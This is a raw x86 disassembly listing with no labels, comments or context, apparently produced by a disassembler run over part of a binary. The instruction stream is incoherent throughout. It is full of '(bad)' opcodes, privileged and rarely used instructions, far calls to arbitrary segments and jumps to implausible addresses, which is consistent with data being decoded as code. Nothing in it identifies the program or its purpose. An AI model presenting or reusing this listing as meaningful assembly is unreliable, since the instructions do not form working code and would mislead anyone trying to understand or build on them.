  419155:	xchg   edx,eax
  419156:	jb     0x419153
  419158:	in     eax,dx
  419159:	ins    DWORD PTR es:[edi],dx
  41915a:	jne    0x419178
  41915c:	pop    eax
  41915d:	sbb    al,0x34
  41915f:	lock push esi
  419161:	ror    DWORD PTR [esi+0x1239b369],1
  419167:	jo     0x4190f2
  419169:	loop   0x41916c
  41916b:	cmp    esp,DWORD PTR [ebx+0xf]
  41916e:	jb     0x41912c
  419170:	sbb    eax,0xdb9dc30a
  419175:	dec    eax
  419176:	ins    BYTE PTR es:[edi],dx
  419177:	jne    0x41917a
  419179:	imul   esi,DWORD PTR [ebp-0x3782a48a],0x757188dc
  419183:	sub    al,0xce
  419185:	in     al,dx
  419186:	sahf   
  419187:	retf   0x1b0e
  41918a:	sbb    cl,BYTE PTR [esi-0x51698cbc]
  419190:	shl    DWORD PTR [edi+eiz*1+0x36],0x7c
  419195:	scas   al,BYTE PTR es:[edi]
  419196:	mov    al,0xee
  419198:	icebp  
  419199:	shl    DWORD PTR [ecx+0x72],1
  41919c:	sub    DWORD PTR [eax],esi
  41919e:	sti    
  41919f:	call   0xaed5:0x884cdcd6
  4191a6:	cmp    al,BYTE PTR [edi-0xfce3ec2]
  4191ac:	in     al,dx
  4191ad:	rcr    DWORD PTR [ebx-0x10eae9c8],0x4c
  4191b4:	js     0x419181
  4191b6:	mov    eax,ds:0xfc61cf0a
  4191bb:	jecxz  0x41918e
  4191bd:	inc    ebx
  4191be:	jg     0x419200
  4191c0:	imul   ebp,DWORD PTR [edx-0x4f],0xffffffcb
  4191c4:	dec    esi
  4191c5:	retf   
  4191c6:	mov    esp,0xbcc13fb7
  4191cb:	rol    BYTE PTR [eax+0x60],1
  4191ce:	jno    0x419158
  4191d0:	(bad)  
  4191d1:	mov    esp,0xa26ea402
  4191d6:	mov    esp,0xe58635ea
  4191db:	mov    edx,0x8cf89a8f
  4191e0:	gs inc esi
  4191e2:	add    ch,ah
  4191e4:	and    ebp,eax
  4191e6:	mov    ds:0xfe99ee30,eax
  4191eb:	out    dx,eax
  4191ec:	outs   dx,DWORD PTR ds:[esi]
  4191ed:	sub    edx,esi
  4191ef:	dec    edx
  4191f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191f1:	stc    
  4191f2:	arpl   WORD PTR [ecx],bx
  4191f4:	cmc    
  4191f5:	mov    ds:0xd2e7db60,al
  4191fa:	pop    ds
  4191fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191fc:	mov    dl,0x6
  4191fe:	dec    edi
  4191ff:	jg     0x419206
  419201:	adc    al,0x9a
  419203:	call   0xa3a9:0xb4cda6
  41920a:	sbb    edx,ebx
  41920c:	outs   dx,BYTE PTR ds:[esi]
  41920d:	xchg   esi,eax
  41920f:	mov    dh,0x42
  419211:	cwde   
  419212:	add    dh,BYTE PTR [eax]
  419214:	aam    0x9e
  419216:	lds    ebp,FWORD PTR fs:[ebx+eiz*8-0x6b]
  41921b:	das    
  41921c:	and    al,0xc1
  41921e:	sub    BYTE PTR [eax],cl
  419220:	or     DWORD PTR [ecx-0x60],0xe45986c7
  419227:	mov    ebx,0xd84fd7f7
  41922c:	add    al,0xb9
  41922e:	repnz pop ss
  419230:	push   cs
  419231:	xchg   BYTE PTR [ebp+ebp*4+0x4a],cl
  419235:	sub    eax,0xb7649e51
  41923a:	addr16 pop ss
  41923c:	clc    
  41923d:	mov    edx,0xa82730a7
  419242:	dec    esi
  419243:	jnp    0x419216
  419245:	test   eax,0x264122bd
  41924a:	fnstenv [ecx+0x33ac8ef4]
  419250:	ss mov ch,BYTE PTR ss:[edx-0x40]
  419255:	push   0xfa417654
  41925a:	mov    dl,0xa1
  41925c:	stos   DWORD PTR es:[edi],eax
  41925d:	sbb    al,0xcb
  41925f:	mov    edi,0x33d985f3
  419264:	lods   eax,DWORD PTR ds:[esi]
  419265:	mov    esp,0x15032fcb
  41926a:	dec    edx
  41926b:	je     0x4192e0
  41926d:	ffree  st(0)
  41926f:	cmp    al,0x5a
  419271:	pop    edx
  419272:	and    al,0xe
  419274:	add    BYTE PTR [ecx],ah
  419276:	retf   0x46f0
  419279:	cmp    al,0x54
  41927b:	loopne 0x4192a1
  41927d:	and    al,0x59
  41927f:	(bad)  
  419280:	pop    ebx
  419281:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419282:	cdq    
  419283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419284:	and    BYTE PTR [edx],cl
  419286:	mov    ebx,0xa6322bf2
  41928b:	adc    DWORD PTR [ebx],ecx
  41928d:	mov    edx,0x89c83391
  419292:	dec    ebp
  419293:	or     BYTE PTR [ebx+0x558b084d],cl
  419299:	test   al,0x81
  41929b:	shl    edx,0x8
  41929e:	push   edi
  41929f:	add    BYTE PTR [edi],cl
  4192a1:	scas   eax,DWORD PTR es:[edi]
  4192a2:	retf   0x4d89
  4192a5:	test   al,0x8b
  4192a7:	dec    ebp
  4192a8:	or     BYTE PTR [ebx-0x3e7e53ab],cl
  4192ae:	pushf  
  4192af:	clc    
  4192b0:	add    BYTE PTR fs:[ebx],cl
  4192b3:	retf   0x4d89
  4192b6:	lods   al,BYTE PTR ds:[esi]
  4192b7:	mov    ecx,DWORD PTR [ebp+0x8]
  4192ba:	jmp    0x41b643
  4192bf:	aad    0xa2
  4192c1:	mov    dh,0x8d
  4192c3:	mov    al,0x81
  4192c5:	ror    BYTE PTR [edx+0x26797ce2],0x6e
  4192cc:	adc    BYTE PTR [eax],dl
  4192ce:	mov    WORD PTR [edi],fs
  4192d0:	sbb    al,0x82
  4192d2:	adc    DWORD PTR [edi],0x5c
  4192d5:	add    DWORD PTR [ebx+0x57c79cc2],0x8
  4192dc:	xchg   DWORD PTR [ecx+0x63],edx
  4192df:	jnp    0x4192e4
  4192e1:	xlat   BYTE PTR ds:[ebx]
  4192e2:	stc    
  4192e3:	loope  0x41928b
  4192e5:	out    0xa4,eax
  4192e7:	fwait
  4192e8:	test   al,0x90
  4192ea:	sbb    al,0xda
  4192ec:	cwde   
  4192ed:	ins    DWORD PTR es:[edi],dx
  4192ee:	(bad)  
  4192ef:	bound  ecx,QWORD PTR [eax+0x61]
  4192f2:	imul   bh
  4192f4:	push   es
  4192f5:	mov    ds:0x42be94b7,eax
  4192fa:	push   0xd22848c9
  4192ff:	or     BYTE PTR [edi+0x77],bh
  419302:	pop    esi
  419303:	icebp  
  419304:	aam    0x71
  419306:	add    eax,0xf47f9c88
  41930b:	xchg   ebx,eax
  41930c:	fucomp st(1)
  41930e:	sbb    BYTE PTR [ecx-0x204918aa],ah
  419314:	js     0x419382
  419316:	addr16 mov bh,0xde
  419319:	int    0x96
  41931b:	inc    ebx
  41931c:	into   
  41931d:	outs   dx,BYTE PTR ds:[esi]
  41931e:	xchg   DWORD PTR [ebx+0x7],ebp
  419321:	pop    esp
  419322:	jns    0x419366
  419324:	ret    
  419325:	inc    ebx
  419326:	mov    eax,0x38e7e1d0
  41932b:	sbb    dl,al
  41932d:	in     al,dx
  41932e:	jp     0x419315
  419330:	daa    
  419331:	pop    ebp
  419332:	cdq    
  419333:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419334:	cmp    eax,0x5fef6905
  419339:	fs dec esi
  41933b:	leave  
  41933c:	pop    esp
  41933d:	sub    BYTE PTR [ebp+0x52],0x67
  419341:	mov    bh,0x3b
  419343:	push   0x5f
  419345:	and    dl,BYTE PTR [eax+0x42e882a3]
  41934b:	jecxz  0x419302
  41934d:	dec    eax
  41934e:	sub    dh,0xf0
  419351:	test   BYTE PTR [ebx-0x5b92f128],dh
  419357:	sbb    bl,bh
  419359:	pop    esp
  41935a:	pusha  
  41935b:	jo     0x41932b
  41935d:	jmp    0x4192f3
  41935f:	jne    0x4192f6
  419361:	mov    dl,0x3e
  419363:	and    eax,0x520523a3
  419368:	iret   
  419369:	dec    ecx
  41936a:	inc    esi
  41936b:	(bad)  
  41936c:	outs   dx,DWORD PTR ds:[esi]
  41936d:	jg     0x4192f4
  41936f:	adc    BYTE PTR [ebp+0x0],0x72
  419373:	and    eax,0x6e449fd5
  419378:	xor    BYTE PTR [edi],0xf7
  41937b:	js     0x4193c3
  41937d:	nop
  41937e:	adc    ch,BYTE PTR [esi+0x66]
  419381:	fisubr WORD PTR [edx+0x632ffdb2]
  419387:	enter  0x9743,0xaf
  41938b:	add    al,0xa1
  41938d:	imul   ebp,DWORD PTR [edi+0x1e725672],0x3e
  419394:	push   cs
  419395:	loopne 0x419337
  419397:	cmp    eax,0xc5c1736a
  41939c:	xchg   esp,eax
  41939d:	aaa    
  41939e:	sub    ebp,DWORD PTR [ecx]
  4193a0:	outs   dx,DWORD PTR ds:[esi]
  4193a1:	jmp    0x4193ab
  4193a3:	pop    ebx
  4193a4:	enter  0xb04,0x29
  4193a8:	cmp    eax,0x439faa28
  4193ad:	mov    ds:0x2a87f545,eax
  4193b2:	(bad)  
  4193b3:	daa    
  4193b4:	imul   eax,DWORD PTR [ebx],0xffffffb2
  4193b7:	out    0xba,eax
  4193b9:	cwde   
  4193ba:	or     edx,ebx
  4193bc:	fucomip st,st(7)
  4193be:	(bad)  
  4193bf:	mov    esp,0x9ad77819
  4193c4:	mov    ah,0x2e
  4193c6:	inc    edx
  4193c7:	out    dx,al
  4193c8:	cmp    bl,BYTE PTR [ebx]
  4193ca:	dec    edi
  4193cb:	xchg   edi,edx
  4193cd:	xchg   esp,eax
  4193ce:	inc    eax
  4193cf:	js     0x4193da
  4193d1:	dec    esp
  4193d2:	adc    ch,ch
  4193d4:	xor    esi,DWORD PTR [eax]
  4193d6:	and    eax,0x70a27417
  4193db:	push   es
  4193dc:	jmp    0xb2bd:0xde57f53
  4193e3:	jne    0x4193b0
  4193e5:	jno    0x419435
  4193e7:	stos   BYTE PTR es:[edi],al
  4193e8:	call   0x20e8:0xddfae60d
  4193ef:	leave  
  4193f0:	(bad)  
  4193f1:	in     eax,dx
  4193f2:	arpl   WORD PTR [ebx+0x661e5b2f],cx
  4193f8:	div    BYTE PTR ds:0xc5c345ea
  4193fe:	aaa    
  4193ff:	sub    eax,esp
  419401:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419402:	(bad)  
  419403:	loop   0x419472
  419405:	sbb    edi,DWORD PTR [eax+0x4a]
  419408:	std    
  419409:	and    BYTE PTR [ecx-0x31],bh
  41940c:	xor    esi,DWORD PTR [edx-0x49306b0c]
  419412:	mov    ebx,0x47a9a126
  419417:	mov    BYTE PTR [esi-0x5cb0ffbe],bl
  41941d:	sub    ebp,edx
  41941f:	mov    esi,0xf3b7c12f
  419424:	cmp    ch,BYTE PTR [edi]
  419426:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419427:	sub    al,0x77
  419429:	push   edi
  41942a:	cmp    esi,DWORD PTR [ecx+eiz*2+0x52fee055]
  419431:	loopne 0x419437
  419433:	retf   
  419434:	das    
  419435:	mov    ah,0xf2
  419437:	repnz xchg ebp,eax
  419439:	xor    cl,BYTE PTR [esi-0x593bf221]
  41943f:	aam    0x4a
  419441:	push   ss
  419442:	push   ecx
  419443:	sti    
  419444:	aaa    
  419445:	xor    dh,BYTE PTR [ebp-0x5a]
  419448:	in     eax,0xa4
  41944a:	clc    
  41944b:	(bad)  
  41944c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41944d:	retf   0x7948
  419450:	push   es
  419451:	xor    DWORD PTR ds:0x50fec44f,esi
  419457:	ja     0x419453
  419459:	xor    al,0x57
  41945b:	xor    edi,edi
  41945d:	mov    edx,0xb4ed02be
  419462:	sub    dh,BYTE PTR [esi-0x56]
  419465:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419466:	in     al,dx
  419467:	rol    bl,cl
  419469:	popf   
  41946a:	rcr    BYTE PTR [eax-0x6f],0x23
  41946e:	test   BYTE PTR [ebx+0xf30afa7],al
  419474:	hlt    
  419475:	push   0xffffff84
  419477:	or     DWORD PTR gs:0x8a4a4076,esi
  41947e:	(bad)  
  41947f:	gs or  al,0xc1
  419482:	fstp   QWORD PTR [esi]
  419484:	sbb    eax,0x47ae6faa
  419489:	iret   
  41948a:	inc    ecx
  41948b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41948c:	xor    BYTE PTR [edx+0x33013307],al
  419492:	clc    
  419493:	push   ds
  419494:	mov    al,ds:0x5db9713b
  419499:	mov    DWORD PTR [ecx+0x2a],esi
  41949c:	clc    
  41949d:	push   ebx
  41949e:	mov    bh,0x15
  4194a0:	pop    es
  4194a1:	clc    
  4194a2:	(bad)  
  4194a3:	jns    0x41945b
  4194a5:	push   eax
  4194a6:	lahf   
  4194a7:	(bad)  
  4194a8:	shr    edx,1
  4194aa:	xchg   ecx,eax
  4194ab:	push   ecx
  4194ac:	repz mov bl,0xe5
  4194af:	cmc    
  4194b0:	jmp    0x6cc4:0xe465c229
  4194b7:	pop    ss
  4194b8:	sbb    dh,bh
  4194ba:	mov    cl,BYTE PTR [eax]
  4194bc:	sub    eax,0x55b7da26
  4194c1:	xchg   ebp,eax
  4194c2:	sbb    edx,DWORD PTR [edx-0x5381d613]
  4194c8:	push   0x78
  4194ca:	pushf  
  4194cb:	lds    ebp,FWORD PTR [edx]
  4194cd:	clc    
  4194ce:	mov    al,0x3d
  4194d0:	sub    eax,0xe974cbdb
  4194d5:	stc    
  4194d6:	sbb    al,0x4a
  4194d8:	call   0x1d74:0x61f422da
  4194df:	ins    DWORD PTR es:[edi],dx
  4194e0:	lods   al,BYTE PTR ds:[esi]
  4194e1:	nop
  4194e2:	sbb    eax,0x865011da
  4194e7:	pop    eax
  4194e8:	cmp    al,0xfb
  4194ea:	push   cs
  4194eb:	fwait
  4194ec:	mov    ebx,0xcd22abb8
  4194f1:	int3   
  4194f2:	popa   
  4194f3:	sub    dh,BYTE PTR [esi-0x6b]
  4194f6:	ret    
  4194f7:	and    eax,0x49c68a17
  4194fc:	(bad)  
  4194fe:	push   ecx
  4194ff:	or     eax,0x54f25a75
  419504:	mov    ebp,0x859849af
  419509:	retf   
  41950a:	dec    ecx
  41950b:	sar    ebp,0xfe
  41950e:	jno    0x4194d9
  419510:	jno    0x419566
  419512:	cmp    dh,al
  419514:	mov    eax,ds:0x57d93aa8
  419519:	test   DWORD PTR [eax],esi
  41951b:	pusha  
  41951c:	inc    ebx
  41951d:	pop    esp
  41951e:	ss push ecx
  419520:	push   ss
  419521:	mov    eax,ds:0x9ee0f9fd
  419526:	or     DWORD PTR [ebx],0x9317be46
  41952c:	lds    edx,FWORD PTR [ebx+0x62]
  41952f:	push   ss
  419530:	rcr    DWORD PTR [esi+0x181cb20c],cl
  419536:	mov    dl,0x9f
  419538:	mov    al,ds:0xaf6957d9
  41953d:	add    ebx,DWORD PTR [ebx+0x2e]
  419540:	(bad)  
  419541:	leave  
  419542:	cmp    eax,0x365c1b10
  419547:	lock jle 0x419559
  41954a:	retf   
  41954b:	scas   eax,DWORD PTR es:[edi]
  41954c:	call   0x19b9:0x2929754e
  419553:	jp     0x419506
  419555:	test   al,0x7b
  419557:	push   esp
  419558:	sahf   
  419559:	or     bl,BYTE PTR [esi+0x7ea1f7ca]
  41955f:	adc    al,0x30
  419561:	and    cl,dh
  419563:	jmp    0xfad39df0
  419568:	sub    edi,DWORD PTR [ebx+0xf844cf2]
  41956e:	in     al,0x3d
  419570:	adc    al,0x29
  419572:	sahf   
  419573:	inc    eax
  419574:	ja     0x419543
  419576:	stos   DWORD PTR es:[edi],eax
  419577:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419578:	push   ds
  419579:	ret    
  41957a:	sbb    DWORD PTR [ebx-0x49],ebp
  41957d:	sub    eax,0x57faeb8a
  419582:	or     al,0x16
  419584:	icebp  
  419585:	out    0x9a,al
  419587:	adc    BYTE PTR [ecx-0x55732e4c],0xa6
  41958e:	adc    eax,0xe17fd7e3
  419593:	imul   ecx,DWORD PTR [ecx+edx*8-0xe],0x14
  419598:	scas   al,BYTE PTR es:[edi]
  419599:	add    eax,0x58cc26c3
  41959e:	test   BYTE PTR [bx+si],dl
  4195a1:	or     eax,0x295f301e
  4195a6:	and    DWORD PTR [ecx-0x2ba523a0],edx
  4195ac:	or     cl,0x52
  4195af:	xchg   ebx,eax
  4195b0:	and    DWORD PTR [esi+edx*4+0x2763fe0f],0x61
  4195b8:	sbb    al,0x92
  4195ba:	loopne 0x419625
  4195bc:	and    DWORD PTR [edi],esp
  4195be:	add    DWORD PTR [ecx+0x61d7eeef],0xffffffb0
  4195c5:	rcr    DWORD PTR [ebp-0xa40064],0x87
  4195cc:	into   
  4195cd:	mov    al,ds:0x3b0b4d56
  4195d2:	mov    DWORD PTR ds:0xf40b8283,edx
  4195d8:	sub    eax,0x513f3b2
  4195dd:	test   DWORD PTR [ebp+0x4e],0x9eaf04dd
  4195e4:	mov    ebp,0x68ee8577
  4195e9:	in     eax,0x65
  4195eb:	mov    esp,0xe26fc7a2
  4195f0:	mov    ah,0x0
  4195f2:	stos   DWORD PTR es:[di],eax
  4195f4:	mov    bl,BYTE PTR [ebp-0x47]
  4195f7:	mov    ds:0xd0a73a32,eax
  4195fc:	aam    0xe1
  4195fe:	(bad)  
  4195ff:	xlat   BYTE PTR ds:[ebx]
  419600:	cmc    
  419601:	add    dh,ch
  419603:	std    
  419604:	fnstcw WORD PTR [ebx+0x23]
  419607:	or     al,0xec
  419609:	mov    ebx,0x458c0e9d
  41960e:	push   DWORD PTR ds:0x71a3d374
  419614:	test   bl,0xd0
  419617:	sub    BYTE PTR [esi-0x47f674d],al
  41961d:	imul   BYTE PTR [eax+0x2d74fc74]
  419623:	popa   
  419624:	test   DWORD PTR [ecx],ebx
  419626:	pop    ds
  419627:	rcr    BYTE PTR [edi-0x3b],1
  41962a:	adc    al,0xcd
  41962c:	add    esp,DWORD PTR [ecx-0x7e]
  41962f:	test   al,0xdd
  419631:	push   0xfe30041
  419636:	push   cs
  419637:	stc    
  419638:	adc    edx,ecx
  41963a:	push   0x6527db76
  41963f:	fwait
  419640:	aad    0xdd
  419642:	push   es
  419643:	adc    cl,bh
  419645:	sub    DWORD PTR [edi-0x6d4a665],edx
  41964b:	test   BYTE PTR [ebx+esi*1-0x79],cl
  41964f:	rcl    cl,1
  419651:	and    al,0x59
  419653:	push   esi
  419654:	popf   
  419655:	mov    ebx,0x6af9102b
  41965a:	inc    edx
  41965b:	cmp    edx,DWORD PTR [ecx+edx*2]
  41965e:	fstp   QWORD PTR [ebp+eax*2+0x140dc45d]
  419665:	neg    eax
  419667:	mov    dl,bh
  419669:	xor    al,0xe9
  41966b:	mov    ecx,0xc31845b6
  419670:	js     0x419612
  419672:	ficomp WORD PTR [ebx+0x56]
  419675:	loope  0x419642
  419677:	and    DWORD PTR [ecx+0x229794aa],eax
  41967d:	mov    ch,0x9f
  41967f:	xchg   edx,eax
  419680:	mov    WORD PTR [edi-0x298b4be7],gs
  419686:	push   esp
  419687:	and    DWORD PTR [esi-0x24],ebp
  41968a:	test   al,0x27
  41968c:	xchg   BYTE PTR [edx],dh
  41968e:	jp     0x4196f4
  419690:	jne    0x419695
  419692:	div    BYTE PTR [edx+0x12c63f25]
  419698:	stos   BYTE PTR es:[edi],al
  419699:	das    
  41969a:	jb     0x41969b
  41969c:	call   0xa79f:0xe9f6036a
  4196a3:	in     eax,0x3e
  4196a5:	jmp    0x4196d4
  4196a7:	mov    eax,0x4239b18d
  4196ac:	dec    ecx
  4196ad:	dec    ecx
  4196ae:	push   es
  4196af:	and    eax,0x198da33a
  4196b4:	stc    
  4196b5:	sbb    BYTE PTR [ebx-0x4a],0xeb
  4196b9:	arpl   WORD PTR [esi],si
  4196bb:	push   ecx
  4196bc:	aad    0x33
  4196be:	dec    edi
  4196bf:	jns    0x419695
  4196c1:	adc    DWORD PTR [ebx+0x14],eax
  4196c4:	cmp    DWORD PTR [esi],ebx
  4196c6:	aam    0x1f
  4196c8:	cmp    eax,0xe6a587be
  4196cd:	int3   
  4196ce:	data16 in al,dx
  4196d0:	cmp    cl,cl
  4196d2:	cli    
  4196d3:	mov    bl,0xc0
  4196d5:	jns    0x419735
  4196d7:	jns    0x4196ab
  4196d9:	adc    dl,dl
  4196db:	addr16 cmp eax,0x27c36581
  4196e1:	push   ecx
  4196e2:	pushf  
  4196e3:	(bad)
  4196e6:	mul    BYTE PTR [esi]
  4196e8:	test   DWORD PTR [ecx+edi*8+0x75b53de1],0xbc0e3c92
  4196f3:	(bad)  
  4196f4:	icebp  
  4196f5:	or     eax,0x4edc4e9c
  4196fa:	test   al,0x15
  4196fc:	jne    0x4196c6
  4196fe:	or     BYTE PTR [ebp-0x24440f2e],dl
  419704:	mov    ebp,0x5a8087b4
  419709:	pop    edx
  41970a:	mov    dh,0x55
  41970c:	cwde   
  41970d:	shl    BYTE PTR [esi],0x74
  419710:	fwait
  419711:	setbe  BYTE PTR [eax]
  419714:	pop    ss
  419715:	sahf   
  419716:	hlt    
  419717:	fisub  DWORD PTR [ecx]
  419719:	clc    
  41971a:	inc    BYTE PTR [ecx+0x51]
  41971d:	daa    
  41971e:	xchg   edi,eax
  41971f:	xchg   ebp,eax
  419720:	or     edx,esp
  419722:	lods   al,BYTE PTR ds:[esi]
  419723:	adc    al,0x38
  419725:	xchg   ebx,eax
  419726:	in     al,0xf
  419728:	ins    BYTE PTR es:[edi],dx
  419729:	xor    eax,0xa9134203
  41972e:	sbb    BYTE PTR [esi-0x62],bh
  419731:	lds    esp,FWORD PTR [ecx]
  419733:	adc    eax,0x56f78ae1
  419738:	sub    BYTE PTR ds:0x57b81621,bh
  41973e:	sbb    eax,0x6888ba47
  419743:	sub    ah,dl
  419745:	test   BYTE PTR [ebx+0x58],ah
  419748:	mov    ebx,0x343653df
  41974d:	jns    0x419734
  41974f:	mov    eax,0x99efd68
  419754:	adc    cl,BYTE PTR [esi-0x26]
  419757:	(bad)  
  419758:	jmp    0x419726
  41975a:	dec    ebp
  41975b:	mov    dh,0x94
  41975d:	pushf  
  41975e:	push   es
  41975f:	fist   DWORD PTR [esi]
  419761:	push   es
  419762:	cmp    al,0x67
  419764:	adc    al,0x56
  419766:	jb     0x4197d3
  419768:	jbe    0x419744
  41976a:	xchg   ebx,eax
  41976b:	jnp    0x419796
  41976d:	add    eax,0xb865f2e0
  419772:	loop   0x419746
  419774:	xor    edx,DWORD PTR [ebx+0x36e72712]
  41977a:	push   0xfffffff3
  41977c:	jno    0x419730
  41977e:	imul   esi,ebx,0xeb9665b2
  419784:	cmp    BYTE PTR gs:[eax+0x39a22061],0xcb
  41978c:	jmp    0xdb5e8d7
  419791:	mov    edi,0xa7f9bf47
  419796:	pop    edi
  419797:	adc    edx,edi
  419799:	adc    eax,0x3a0d013e
  41979e:	jge    0x41974b
  4197a0:	jmp    0x419810
  4197a2:	mov    eax,0xa99bec29
  4197a7:	ror    DWORD PTR [ecx-0x7a11cf02],cl
  4197ad:	stos   BYTE PTR es:[edi],al
  4197ae:	mov    ds:0xe91a14d4,eax
  4197b3:	fisub  DWORD PTR [esi+ebp*4-0x44]
  4197b7:	pop    ds
  4197b8:	push   ecx
  4197b9:	lods   al,BYTE PTR ds:[esi]
  4197ba:	and    eax,DWORD PTR [edi]
  4197bc:	pop    ebp
  4197bd:	xchg   ebx,eax
  4197be:	out    dx,eax
  4197bf:	mov    esp,0xaa61d2f
  4197c4:	dec    eax
  4197c5:	jo     0x4197ed
  4197c7:	inc    esp
  4197c8:	mov    fs,WORD PTR [edx-0x5e]
  4197cb:	jle    0x4197cf
  4197cd:	xor    al,0xbf
  4197cf:	push   cs
  4197d0:	in     al,0x4e
  4197d2:	aam    0xbb
  4197d4:	mov    eax,ds:0x7228fd6b
  4197d9:	(bad)  [edx]
  4197db:	push   cs
  4197dc:	icebp  
  4197dd:	repz jp 0x4197db
  4197e0:	dec    ebx
  4197e1:	sar    ebp,0x41
  4197e4:	mov    ebx,0x334a15ee
  4197e9:	shl    DWORD PTR [edx-0x2b],0x8
  4197ed:	pop    ss
  4197ee:	add    edi,DWORD PTR [eax-0x46548be5]
  4197f4:	fnstcw WORD PTR [edi+0x6d686c0b]
  4197fa:	and    DWORD PTR [edx+0x17],esp
  4197fd:	jae    0x419782
  4197ff:	cmp    ch,dl
  419801:	scas   al,BYTE PTR es:[edi]
  419802:	pop    es
  419803:	push   ss
  419804:	and    al,0x4b
  419806:	mov    cl,0xe4
  419808:	pop    esi
  419809:	aad    0xa7
  41980b:	jbe    0x41984b
  41980d:	cmp    DWORD PTR [esi+eiz*2-0x6e8a8140],ebx
  419814:	scas   eax,DWORD PTR es:[edi]
  419815:	xchg   ebx,eax
  419816:	pop    gs
  419818:	jmp    0x4197fb
  41981a:	repz adc dx,WORD PTR [edx]
  41981e:	inc    esp
  41981f:	cmp    eax,0x9d45d084
  419824:	or     al,0xcb
  419826:	push   edx
  419827:	sub    BYTE PTR [eax],al
  419829:	mov    al,0x26
  41982b:	nop
  41982c:	pushf  
  41982d:	leave  
  41982e:	xchg   esi,eax
  41982f:	aaa    
  419830:	in     al,0xd6
  419832:	call   FWORD PTR [esi+eax*8-0x6f4f0890]
  419839:	xor    eax,0xca74d05
  41983e:	(bad)  
  41983f:	push   ecx
  419840:	mov    al,0x34
  419842:	jae    0x4198a8
  419844:	repz dec esp
  419846:	cwde   
  419847:	sub    ecx,DWORD PTR [ebx+0xa]
  41984a:	inc    ecx
  41984b:	adc    DWORD PTR [edx],edx
  41984d:	jbe    0x419808
  41984f:	test   al,0x50
  419851:	out    dx,al
  419852:	add    eax,0x971e7726
  419857:	mov    ecx,?
  419859:	pop    ecx
  41985a:	out    dx,eax
  41985b:	test   BYTE PTR [ecx-0x4f],0x57
  41985f:	mov    ebp,esp
  419861:	and    BYTE PTR [eax],bl
  419863:	push   ss
  419864:	or     cl,BYTE PTR [ecx]
  419866:	sub    DWORD PTR [edi],esi
  419868:	xchg   ecx,edi
  41986a:	call   0xa90d:0x5b0052f4
  419871:	call   0x307769d2
  419876:	jg     0x419826
  419878:	push   esp
  419879:	pop    eax
  41987a:	cld    
  41987b:	fdivr  DWORD PTR [ebx+0x537aa83e]
  419881:	scas   al,BYTE PTR es:[edi]
  419882:	push   edx
  419884:	xor    edi,ebx
  419886:	(bad)  
  419887:	xor    eax,ebp
  419889:	popa   
  41988a:	imul   ebp,DWORD PTR [edi],0x9e5b461a
  419890:	lock ffree st(1)
  419893:	jae    0x4198c0
  419895:	cmc    
  419896:	(bad)  
  419897:	sub    al,0x82
  419899:	(bad)  
  41989a:	xor    eax,0x92dc1a95
  41989f:	retf   
  4198a0:	xor    BYTE PTR [ecx+0x452be5c2],bh
  4198a6:	pop    ebx
  4198a7:	cmp    edx,eax
  4198a9:	test   al,0x67
  4198ab:	callw  0xfd2f
  4198af:	icebp  
  4198b0:	cmp    dh,BYTE PTR [edi+0x32]
  4198b3:	mov    esp,0xfd8c3f56
  4198b8:	stos   DWORD PTR es:[edi],eax
  4198b9:	(bad)  
  4198ba:	xor    ebx,DWORD PTR [ecx]
  4198bc:	jle    0x41992e
  4198be:	inc    ebx
  4198bf:	in     al,0xe3
  4198c1:	adc    BYTE PTR [esi+ebp*8+0x6],bl
  4198c5:	clc    
  4198c6:	mov    ah,0x6f
  4198c8:	mov    ah,cl
  4198ca:	mov    edx,DWORD PTR [ebx-0x7d]
  4198cd:	das    
  4198ce:	stos   DWORD PTR es:[edi],eax
  4198cf:	mov    ecx,0xdc43fd9d
  4198d4:	mov    WORD PTR [esp+eiz*8-0x5f],ss
  4198d8:	idiv   BYTE PTR [ecx-0x54bf6f0]
  4198de:	mov    edx,0x8bb81d07
  4198e3:	ficomp DWORD PTR ds:0x59932be4
  4198e9:	xor    edx,edi
  4198eb:	mov    ds:0xf6cb8238,eax
  4198f0:	dec    eax
  4198f1:	aas    
  4198f2:	mov    ah,0xe
  4198f4:	cmp    eax,0x6ad3f749
  4198f9:	mov    al,ds:0x18d5bcb0
  4198fe:	repnz fnstcw WORD PTR [edi]
  419901:	sbb    al,0xd8
  419903:	mov    bl,0xd7
  419905:	addr16 fwait
  419907:	sbb    ebx,DWORD PTR [eax+0x24]
  41990a:	add    DWORD PTR [eax-0x5888f595],eax
  419910:	mov    bl,BYTE PTR [edi+ebp*2]
  419913:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419914:	adc    al,0x72
  419916:	shl    DWORD PTR [eax],cl
  419918:	mov    ch,0x12
  41991a:	or     eax,0x308bfb0
  41991f:	pop    ebp
  419920:	aad    0x2f
  419922:	and    ch,bh
  419924:	push   ebp
  419925:	aam    0x5f
  419927:	shl    bh,1
  419929:	popa   
  41992a:	push   ds
  41992b:	lds    esi,FWORD PTR [ebx+edx*1]
  41992e:	mov    esp,0x5a12661b
  419933:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419934:	adc    edx,DWORD PTR [eax+0x25d071a8]
  41993a:	lahf   
  41993b:	cmp    DWORD PTR [ebp+0x7c],ebp
  41993e:	push   ebp
  41993f:	das    
  419940:	cwde   
  419941:	popf   
  419942:	jo     0x4198da
  419944:	xor    eax,0x111c22d6
  419949:	fs addps xmm1,xmm6
  41994d:	push   0x12097f5a
  419952:	(bad)  
  419953:	repnz icebp 
  419955:	mov    ecx,0x3ba072c
  41995a:	push   ss
  41995b:	int    0xf7
  41995d:	mov    ch,0xee
  41995f:	lahf   
  419960:	fwait
  419961:	mov    ch,0x78
  419963:	sub    eax,0xc1cae8a2
  419968:	shl    esp,1
  41996a:	imul   edx,DWORD PTR [ebx+ebx*2-0x17257145],0xe
  419972:	or     bl,BYTE PTR [eax-0x3a]
  419975:	call   DWORD PTR [ebx]
  419977:	jge    0x4199bc
